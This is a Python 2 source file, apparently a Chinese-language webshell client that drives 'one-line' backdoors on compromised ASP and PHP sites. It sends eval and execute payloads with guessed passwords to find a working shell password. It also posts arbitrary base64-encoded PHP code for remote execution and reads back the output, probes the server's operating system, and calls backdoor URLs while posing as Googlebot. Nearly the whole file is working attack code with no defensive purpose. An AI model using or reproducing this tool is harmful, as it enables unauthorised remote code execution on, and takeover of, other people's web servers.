#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#BY: QQ292925842
#import ctypes   #messagebox      MessageBox(None, str(hs), u'提示', 0)
#MessageBox = ctypes.windll.user32.MessageBoxA
import base64
import re,httplib
import urllib2
import gzip,StringIO
import socket
socket.setdefaulttimeout(10)
import time
import g #公共文件
##############################  后门提交 数据
def Aurl_post(URL):  #提交内容
    try:
        req = urllib2.Request(URL)
        req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
        urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        time.sleep(1)
        return 1
    except:
        return 0

def cs(url,PASS): #ASP还是PHP  ,URL地址 ，密码
    try:
        asp_php = g.bool_asp_php(url)
        #选择扫描方式
        if asp_php == "":
            asp_php = "php"
        if asp_php == "asp":
            params = "=execute(\"response.clear:response.write(\"\"jinlaile\"\"):response.end\")"
        elif asp_php == "php":
            #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
            params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
        else:
            params = "=Response.Clear();Response.Write(\"jinlaile\");"

        #构造HTTP头
        #print params
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers = {"Host": ztarget,
                       "User-Agent": "Mozilla/5.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            conn.request(method="POST", url=url, body=params, headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()
                #print data
            if(data.find("jinlaile") >= 0):
                #print "!!!!----PASS FIND!!! -------------->"+PASS
                return 1
                #os._exit(1)
        except Exception,e:
            #print e
            return 0
    except Exception,e:
        #print e
        return 0

def post_eval_data(url,PASS,params): #URL地址 ，密码   只支持PHP
    try:
    #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
    #params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
    #            data_base64=base64.b64encode(data)
    #            params = "=@eval(base64_decode($_POST[z0]));&z0=%s"%(urllib.quote(data_base64))  #quote URL编码
        #构造HTTP头
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,
                     "User-Agent": "Mozilla/5.0",
                     "Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            #print params
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()
                return data
            return data
        except Exception,e:
            #print e
            return 0

    except Exception,e:
        #print e
        return 0

def yijuhua_win_linux(url,PASS): #URL地址 ，密码   返回操作系统
    try:
        #选择扫描方式
        #params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="

        params = "=echo PHP_OS;"
        #构造HTTP头
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()
            if "WINNT" in data:
                return "WinNT"
            if "Linux" in data:
                return "Linux"
            if "FreeBSD" in data:
                return "FreeBSD"
            return "null"
        except Exception,e:
            #print e
            return 0
    except Exception,e:
        #print e
        return 0

if __name__=='__main__':
    print cs("http://localhost/long.php","long123") #ASP还是PHP  ,URL地址 ，密码